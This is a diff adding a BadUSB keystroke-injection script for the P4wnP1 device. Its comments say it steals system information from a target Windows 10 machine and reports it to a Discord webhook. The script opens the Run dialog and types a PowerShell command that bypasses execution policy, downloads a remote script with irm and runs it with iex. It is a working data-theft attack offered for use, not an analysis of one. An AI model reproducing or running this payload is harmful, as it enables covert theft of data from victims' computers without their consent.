@@ -1,0 +1,20 @@
+REM Title: P4wnP1_System_Info_Stealer_Payload
+REM Author: White Hat Hacker
+REM Description: Steals all system info from target and reports to a discord webhook. Make sure you change the DISCORD_WEBHOOK_HERE to the actual URL.
+REM Target: Windows 10 (Powershell)
+REM Props: Beigeworm
+REM Version: 1.0
+REM Category: BadUSB
+
+
+// Replace DISCORD_WEBHOOK_HERE before running!
+
+// script setup
+layout("us")
+
+// Open Powershell as Admin
+press("GUI r");
+delay(1000);
+type("powershell -NoP -Ep Bypass -C $dc='DISCORD_WEBHOOK_HERE'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/Sys-Info-to-DC.ps1 | iex;");
+delay(500);
+press("ENTER");
